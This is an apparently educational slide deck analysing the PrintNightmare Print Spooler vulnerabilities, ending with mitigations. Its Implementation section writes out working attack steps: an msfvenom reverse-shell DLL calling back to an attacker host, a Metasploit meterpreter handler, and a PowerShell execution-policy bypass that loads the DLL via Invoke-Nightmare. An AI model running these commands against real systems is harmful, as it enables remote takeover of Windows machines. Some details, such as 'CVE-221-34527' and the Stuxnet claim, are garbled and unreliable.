* Introduction
- Windows has a service called Print Spooler
- Manages all local and network printing

** CVEs
- *CVE-2021-1675*, low class vulnerability, allowed privilege escalation
- Required direct access to the system thus labeled low risk
- Fixed by MS as of Jun 8, 2021
- *CVE-221-34527*, high risk, allowed remote code execution
- Rated 8.8 on the Common Vulnerabiltity Scoring System Scale
** Framework
- *mimikatz* was first to implement the exploit with both CVEs
- It was first created as a PoC to show vulns in MS authentication protocols
- Now it is used by attackers and pentesters to detect potential exploits

* Vulnerabiltity Analysis
- Two vulns are triggered by the PrintSpoolerService RPC method

  #+ATTR_HTML: :width 70%
  [[./assets/nspt/cve2.png]]

** Continued ..

- Once the RPC functions are processed, the YAddPrinterDriverEx function is called
- There is no conditional judgment on the param dwFileCopyFlags
- The AddPrinterDriverEx function installs local/remote printer drivers and links config, data and driver files
  #+ATTR_HTML: :class middle :width 30%
  [[./assets/nspt/addprinter.png]]

** Continued ..
- dwFileCopyFLags can set "APD INSTALL WARNED DRIVER" flag
- When printer driver is added, the DLL is loaded with highest permission

  #+ATTR_HTML: :class middle :width 50%

** The Vulnerability
- Use Process monitor to capture exploit when DLL is loaded
  #+ATTR_HTML: :width 70%
  [[./assets/nspt/pm.png]]
- dwFileCopyFlags check is skipped when calling YAddPrinterDriverEx method
    #+ATTR_HTML: :width 60%
  [[./assets/nspt/yadd.png]]
    [[./assets/nspt/apd.png]]
** ValidateObjectAccess
- mimikatz will pass RpcBindingSetAuthInfoEx method with some params
- After execution, user sets username which is regarded as permission
- ValidateObjectAccess result is 0 for user and 1 for admin
    #+ATTR_HTML: :width 60%
  [[./assets/nspt/rpcbind.png]]

#+REVEAL: split
#+ATTR_HTML: :style text-align:left
- If the "APD INSTALL WARNED DRIVER" flag is 0x8000, the result of _bittest method will be 1
- v12 will be set to 0 and ValidateObjectAccess is bypassed
    #+ATTR_HTML: :width 60% :class middle
  [[./assets/nspt/bittest.png]]

** ValidateDriverInfo
- This part checks if the driver name is valid
- Execution flow is as follows:
  - Check if it is a local file
  - Check init key
  - Verify legitimacy of the driver file
    [[./assets/nspt/vdi.png]]
- When dwFileCopyFlags contains APD INSTALL WARNED DRIVER, the result is 0x8000 and value is 0
- This skips further verification by driver

    #+ATTR_HTML: :width 50%
  [[./assets/nspt/dwfile.png]]
** Get file handle
- Value of v13 is obtained by inverting lower 8 bits of dwFileCopyFlags
- Shifting it 4 bits to right and performing AND with 1
- v13 determines 5th param of the CreateInternalDriverFileArray
    #+ATTR_HTML: :width 60%
  [[./assets/nspt/spl.png]]
- After calculation, when value of lower 8 bits of dwFileCopyFlags is 0x1X, a5 can be set to 0
#+REVEAL: split
- When a5 is 0, validity check of the driver can be avoided
    #+ATTR_HTML: :width 50%
  [[./assets/nspt/a5.png]]
- Open file via CreateFile method, get 3 file handles
- Save them in space requested by DllAllocSplMem method for later file update use
  [[./assets/nspt/dll.png]]

** Copy files to driver space
- pConfigFile, pDataFile and pDriverPath save their respective file paths
- When moving files of the above members, the following operations are required:
  - Check file info of the file handle
  - Copy file to *"C:\Windows\System32\spool\drivers\x64\3\new"*
  - Using MoveNewDriverRelatedFiles, move files and realize the update file
    #+ATTR_HTML: :width 60%
    [[./assets/nspt/copy.png]]
** Update Driver Files
- Load the new config file
- When loaded it will run the driver's DLL
- Our DLL will be executed with highest permission
  [[./assets/nspt/update.png]]

* Implementation
- Environment:
  - Windows 10 1607
  - Kali 2022.3
  - Python 3.10.5

- Git repos used:
  - https://github.com/tryhackme/impacket
  - https://github.com/JohnHammond/CVE-2021-34527

- python requires impacket which can be installed through github

** Setup
- Setup exploit DLL
  #+begin_src
msfvenom -p /path/to/reverse_tcp LHOST=[YOUR_IP] LPORT=4545 -f dll -o reverse_tcp.dll
  #+end_src
- Execute DLL
  #+begin_src
smbserver.py share [YOUR_EXPLOIT_DLL_LOCATION] -smb2support

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST [YOUR_IP]
set LPORT 4545
run -j
  #+end_src
- DLL Injection
    #+begin_src
powershell -ep bypass
..\CVE-2021-1675.ps1
Invoke-Nightmare -DLL C:\Users\test\Desktop\reverse_tcp.dll

# go back to msfconsole
session -i 1
    #+end_src

* Demo
* Conclusion
- Spooler vuln was first used in Stuxnet attack 10 years ago
- MS has taken step to ameliorate the situation and released patches within 5 days
- A quick way to stop the vulnerability is to stop the PrintSpooler service
- Another workaround is to disable the inbound remote printing operations via group policy
